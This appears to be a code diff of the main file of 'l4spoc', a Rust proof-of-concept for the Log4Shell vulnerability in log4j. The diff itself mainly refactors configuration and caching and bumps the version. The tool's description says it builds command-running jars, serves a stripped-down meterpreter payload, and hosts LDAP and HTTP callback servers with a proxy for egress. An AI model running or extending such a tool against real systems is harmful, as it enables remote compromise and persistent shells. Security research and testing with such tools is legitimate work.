@@ -1,5 +1,8 @@
 #![feature(ip)]
 
+#[macro_use]
+extern crate serde_json;
+
 mod web_server;
 mod ldap_server;
 mod build_java;
@@ -7,16 +10,17 @@ mod common;
 mod multiplexed;
 mod tcp_proxy;
 
-use common::{RunServerCfg, BuildCmdCfg, ClassCache};
+use common::{RunServerCfg, BuildCmdCfg, Caches};
 use std::fs;
 use get_if_addrs::{IfAddr, get_if_addrs};
 use clap::{Arg, Command, ArgMatches};
+use std::sync::Arc;
 
 #[tokio::main]
 async fn main() -> () {
     let matches = Command::new("l4spoc")
         .subcommand_required(true)
-        .version("0.9.0")
+        .version("0.10.0")
         .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
         .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.  This version adds a proxy option.  If the request is not LDAP or HTTP it can then proxy the request to another machine, again on the same port.  If the target machine has only one egress port you can server LDAP, HTTP and use the same port to proxy the meterpreter connection to another local port or another machine.")
         .subcommand(Command::new("build")
@@ -112,7 +116,8 @@ async fn main() -> () {
             .expect(&format!("Unable to create {} dir", &build_path));    
         build_java::build_and_save_cmd_class(build_path, cfg).expect("faild to build cmd");
     } else if let Some(m) = matches.subcommand_matches("run"){
-        let cfgs = convert_args_for_run_server_cfg(m);
+        let cfgs = Arc::new(convert_args_for_run_server_cfg(m));
+        let caches = Arc::new(Caches::new());
 //        let build_cfg = BuildCmdCfg{
 //            class_name : "Test".to_string(),
 //            l_cmd : Some("firefox cvs.com".to_string()),
@@ -120,7 +125,7 @@ async fn main() -> () {
 //        };
 //        let the_class = build_java::build_cmd_class(build_cfg);
 //        cfgs.class_cache.set_class("Test.class".to_string(),the_class);
-        run_servers(cfgs).await;
+        run_servers(cfgs, caches).await;
     } 
 }
 
@@ -249,17 +254,16 @@ fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
         ports_file_name : convert_option(m.value_of("Op")),
         failed_file_name : convert_option(m.value_of("Of")),
         proxy_addr : convert_option(m.value_of("proxy")),
-        class_cache : ClassCache::new(),
         allow_build_cmd : m.is_present("allow_cmd"),
         no_fs : m.is_present("no_fs"),
     }
 }
 
-async fn run_servers(rsc: RunServerCfg) -> () {
+async fn run_servers(rsc: Arc<RunServerCfg>, caches: Arc<Caches>) -> () {
 //    fs::create_dir_all(&rsc.web_root)
 //        .expect(&format!("Unable to create {} dir", rsc.web_root));    
     println!("Address base : {}", &rsc.addr);
-    multiplexed::run_multiplexed_servers(rsc).await;
+    multiplexed::run_multiplexed_servers(rsc, caches).await;
 }
 
 fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
